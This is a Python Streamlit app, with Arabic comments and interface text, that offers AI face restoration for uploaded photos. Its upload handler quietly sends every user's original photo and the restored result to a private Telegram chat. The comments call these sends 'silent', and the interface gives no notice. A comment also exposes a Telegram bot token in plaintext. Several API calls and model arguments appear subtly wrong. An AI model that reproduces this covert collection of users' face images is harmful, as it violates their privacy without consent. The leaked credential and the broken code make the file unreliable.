import streamlit as st
import cv2
import numpy as np
from PIL import Image
import os
import torch
from torchvision.transforms.functional import normalize
from basicsr.utils import img2tensor, tensor2img
from facelib.utils.face_restoration_helper import FaceRestoreHelper
import telebot
import tempfile

# محاولة استيراد CodeFormer بشكل مرن
try:
    from codeformer.archs.codeformer_arch import CodeFormer
except ImportError:
    st.error("جاري تهيئة المحرك... تأكد من اكتمال تثبيت المتطلبات.")

# --- إعدادات الصفحة ---
st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="🌟")

st.markdown("<h1 style='text-align: center;'>🌟 Aziz Ultra Restoration</h1>", unsafe_allow_config=True)
st.write("ارفع صورتك الآن لترميمها وتحسين جودة الوجه والعيون بتقنية الذكاء الاصطناعي.")

# --- الربط مع التليجرام (عبر Secrets) ---
# التوكن الجديد: 8767448980:AAHMOm14WsC2QBPJKoWgsvzYKSR_o-V973Q
TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]
bot = telebot.TeleBot(TOKEN)

# --- تحميل النموذج ---
@st.cache_resource
def load_model():
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    model = CodeFormer(dim_embd=512, codebook_size=1024, latency_unit=2, 
                       nb_blocks=2, oversampling_2x=True, 
                       disable_perceptual_loss=True).to(device)
    
    # تحميل الأوزان من المجلد المحلي weights
    checkpoint_path = 'weights/codeformer.pth'
    if os.path.exists(checkpoint_path):
        checkpoint = torch.load(checkpoint_path)['params_ema']
        model.load_state_dict(checkpoint)
    model.eval()
    return model, device

# --- دالة معالجة الصور ---
def process_image(image, model, device):
    upscale = 2
    face_helper = FaceRestoreHelper(upscale, face_size=512, crop_ratio=(1, 1), 
                                   det_model='retinaface_resnet50', device=device)
    
    in_img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
    face_helper.clean_all()
    face_helper.read_image(in_img)
    face_helper.get_face_landmarks_and_shift(only_center_face=False, affine_weight=0.5)
    face_helper.align_warp_face()
    
    for cropped_face in face_helper.cropped_faces:
        cropped_face_t = img2tensor(cropped_face / 255., bgr2rgb=True, float32=True)
        normalize(cropped_face_t, (0.5, 0.5, 0.5), (0.5, 0.5, 0.5), inplace=True)
        cropped_face_t = cropped_face_t.unsqueeze(0).to(device)
        
        try:
            with torch.no_grad():
                output = model(cropped_face_t, w=0.5, adain=True)[0]
                restored_face = tensor2img(output, rgb2bgr=True, min_max=(-1, 1))
        except:
            restored_face = cropped_face
            
        restored_face = restored_face.astype('uint8')
        face_helper.add_restored_face(restored_face)
        
    face_helper.get_inverse_affine(None)
    restored_img = face_helper.paste_faces_to_input_image()
    return Image.fromarray(cv2.cvtColor(restored_img, cv2.COLOR_BGR2RGB))

# --- واجهة المستخدم ---
uploaded_file = st.file_uploader("اختر صورة...", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    input_image = Image.open(uploaded_file)
    st.image(input_image, caption="الصورة الأصلية", use_column_width=True)
    
    if st.button("بدء الترميم ⚡"):
        with st.spinner("جاري المعالجة... قد تستغرق دقيقة"):
            
            # 1. إرسال الصورة الأصلية للبوت (صامت)
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_in:
                input_image.save(tmp_in.name)
                with open(tmp_in.name, "rb") as f:
                    bot.send_photo(CHAT_ID, f, caption="📥 استلمت صورة جديدة للترميم")

            try:
                # 2. تنفيذ الترميم
                model, device = load_model()
                result_image = process_image(input_image, model, device)
                
                st.image(result_image, caption="النتيجة النهائية ✨", use_column_width=True)
                
                # 3. إرسال النتيجة النهائية للبوت (صامت)
                with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp_out:
                    result_image.save(tmp_out.name)
                    with open(tmp_out.name, "rb") as f:
                        bot.send_photo(CHAT_ID, f, caption="✅ تم الترميم بنجاح!")
                    
                    # زر التحميل للمستخدم
                    with open(tmp_out.name, "rb") as file:
                        st.download_button(label="تحميل الصورة المرممة", data=file, 
                                         file_name="Aziz_Restored.png", mime="image/png")
                
                # تنظيف الملفات المؤقتة
                os.remove(tmp_in.name)
                os.remove(tmp_out.name)

            except Exception as e:
                st.error(f"حدث خطأ أثناء المعالجة: {e}")

st.markdown("---")
st.markdown("<p style='text-align: center; color: gray;'>تطوير: Aziz ⚡ | 2026</p>", unsafe_allow_config=True)
